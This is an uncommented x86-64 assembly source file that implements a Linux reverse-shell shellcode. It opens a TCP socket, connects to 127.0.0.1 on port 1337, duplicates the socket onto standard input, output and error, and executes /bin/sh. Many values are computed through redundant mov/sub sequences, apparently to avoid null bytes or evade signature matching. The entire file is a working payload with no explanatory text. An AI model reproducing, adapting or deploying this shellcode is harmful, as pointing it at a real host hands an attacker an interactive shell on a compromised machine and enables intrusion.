BITS 64
global _start

section .text
_start: 
xor r15,r15
mov rax,r15
xor rdi,rdi
mov rsi,0x01
sub rsi,0x01
xor rdx,rdx
mov rdx,0x01
sub rdx,0x01
mov sil,0x01
mov dil,7
sub dil,5
mov al,0x29
syscall
mov r9b,al
mov dil,r9b
xor r11,r11
push 0x0100007f
push word 0x3905
push word 0x2
mov r8,rsp
mov rsi,r8
mov dl,0x10
mov al,55
sub al,13
syscall
mov r11,0x01
sub r11,0x01
mov dil,0x03
mov r9,r11
mov rsi,r9
mov al,0x21
syscall
xor r12,r12
mov r11,r12
mov dil,0x03
mov sil,14
sub sil,13
mov al,0x21
syscall;
mov r11,0x01
sub r11,0x01
mov dil,0x03
mov sil,11
sub sil,9
mov al,0x21
syscall;
mov rax,0x01
sub rax,0x01
xor rdi,rdi
xor r15,r15
mov rsi,r15
xor r13,r13
mov r12b,59
mov al,r12b
mov rdi,"/bin/sh"
push r13
push rdi
mov r15,rsp
mov rdi,r15
push r13
push rdi
mov r8,rsp
mov rsi,r8
xor rdx,rdx
syscall
